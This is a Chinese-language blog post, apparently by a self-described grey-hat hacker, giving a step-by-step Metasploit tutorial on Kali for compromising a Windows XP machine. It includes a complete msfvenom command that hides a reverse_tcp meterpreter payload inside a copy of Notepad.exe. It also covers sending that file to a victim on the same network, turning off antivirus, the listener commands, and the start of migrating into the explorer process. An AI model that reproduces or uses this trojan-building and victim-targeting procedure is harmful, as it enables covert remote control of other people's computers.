---
layout: post
title: Kali用软件来攻击Windows
tags: linux windows
---

Metasploit=> MakeSoftware=> StartOnWindows

---

### 前言
你先弄出一个我们经常用的应用程序，然后把连接会话藏到这些应用里。这就是为什么在那些2008、2009年时说的“不要下载网站上未知来源的东西”。  
但现在我们有了360安全卫士啊，电脑管家啊那些杀毒软件就变得安全多了。对于我这个灰帽黑客兼MC博主来讲，This is a LITTLE problem。  
But anyways，我们关掉那台Xp的杀毒软件就行了鸭［滑稽］。  
好吧我们废话不多说，开始正题。

### 01.编译软件和发送
先在`~/`的位置里放置从电脑上拷贝出来的Notepad.exe  
然后在kali命令行里输入这段命令:  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.106.12.175 LPORT=4444 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe > ~/NotepadPro.exe
```
我们看到-p指到了reverse_tcp了。-p全写就是payload鸭。  
`LHOST`是指你的Kali电脑的ip地址。  
`LPORT`是指你的Kali电脑的端口。随情况而定。  
`-x`是指源，然后msfvenom根据源进行修改和添加。    
至于后面，是指转成X86（32位系统）的软件exe格式。  
  
你会发现在`~/`的位置下生成了一个`NotepadPro.exe`。  
把它发给在同一个局域网的用户，并指示受害者打开。前提是360要关掉。  
否则..  
![]({{ site.imgbed }}/img/kalihack/06.png)

### 02.设置内容并等待受害者打开文件
```msf
use exploit/multi/handler
//表示使用活动指向的监听器
```
```msf
set LHOST 192.106.12.175
//设置本机ip
```
```msf
set LPORT 4444
//设置本机端口
```
```msf
set payload windows/meterpreter/reverse_tcp
//设置载荷为*比较开放的tcp*
```
```msf
exploit
//开启监听
```
注意，开启监听后你不会立刻进入`meterpreter`命令提示符的shell直到受害者打开所谓的`NotepadPro.exe`应用。  
可受害者打开后察觉没啥意思后会关闭。关闭后，你将无法继续使用`meterpreter`。怎么办呢？我们需要**注入进程**！  

### 03.注入进程
我们看到这里，已经开始做**最坏的打算了**！  
我们进入`meterpreter`提示符后输入
```msf
ps
```
来查看进程，注意一个进程为`explorer`的内容，记下它的`pid号`。
![]({{ site.imgbed }}/img/kalihack/07.png)
![]({{ site.imgbed }}/img/kalihack/08.png)
`explorer`的*pid*是`4560`.  
融进`explorer`！
![]({{ site.imgbed }}/img/kalihack/09.png)
